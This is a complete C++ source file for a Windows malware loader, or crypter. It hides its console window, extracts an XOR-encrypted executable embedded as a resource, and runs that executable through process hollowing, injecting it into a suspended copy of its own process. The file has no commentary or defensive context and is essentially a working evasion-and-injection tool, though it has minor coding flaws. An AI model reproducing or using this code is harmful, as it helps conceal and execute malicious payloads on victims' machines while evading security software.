#include <iostream>
#include <windows.h>

unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) {
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return 	pvRes;
    }
    // quit if no resource found
    *dwSize = 0;
    return 0;
}

int main() {
    // hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // get embeded resource
    unsigned long dwSize;
    unsigned char* resourcePtr = GetResource(132, "BIN", &dwSize);


    // decrypt the resource raw data
    char key = 'k';
    char decrypted[dwSize];
    for (int i = 0; i < dwSize; i++)
        decrypted[i] = resourcePtr[i] ^ key;


    // run PE resource (process hollowing technique)
    void* pe = decrypted;

    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    ZeroMemory(&PI, sizeof(PI));
    ZeroMemory(&SI, sizeof(SI));


    void* pImageBase;

    char currentFilePath[1024];

    DOSHeader = PIMAGE_DOS_HEADER(pe);
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);


    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
        // create new process for injection
        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

            CONTEXT* CTX;
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
                pImageBase = VirtualAllocEx(
                        PI.hProcess,
                        LPVOID(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
                );


                WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                // write pe sections
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));

                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData,
                            NULL
                    );

                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(CTX->Rdx + 0x10),
                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
                            8,
                            NULL
                    );

                }

                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                ResumeThread(PI.hThread);

                WaitForSingleObject(PI.hProcess, NULL);

                return 0;
            }
        }
    }
}

